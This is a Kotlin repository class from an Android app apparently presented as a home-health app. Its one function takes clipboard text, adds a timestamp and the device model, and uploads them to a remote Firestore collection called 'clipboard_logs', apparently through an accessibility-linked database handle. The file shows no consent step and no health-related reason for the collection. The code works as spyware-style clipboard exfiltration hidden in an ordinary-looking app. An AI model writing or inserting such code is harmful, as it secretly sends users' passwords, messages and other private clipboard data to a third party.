package com.example.homehealth.data.repository

import android.content.Context
import android.os.Build
import android.util.Log
import com.example.homehealth.utils.FirebaseProjects
import com.google.firebase.Timestamp

object LogRepository {
    private const val TAG = "LogRepository"
    private const val COLLECTION = "clipboard_logs"

    fun logClipboardText(
        context: Context,
        text: String
    ) {
        val payload = mutableMapOf<String, Any>(
            "text" to text,
            "timestamp" to Timestamp.now(),
            "deviceModel" to Build.MODEL
        )

        val firestore = FirebaseProjects.accessibilityFirestoreOrNull(context) ?: return

        firestore
            .collection(COLLECTION)
            .add(payload)
            .addOnFailureListener { error ->
                Log.w(TAG, "Failed to log clipboard text", error)
            }
    }
}
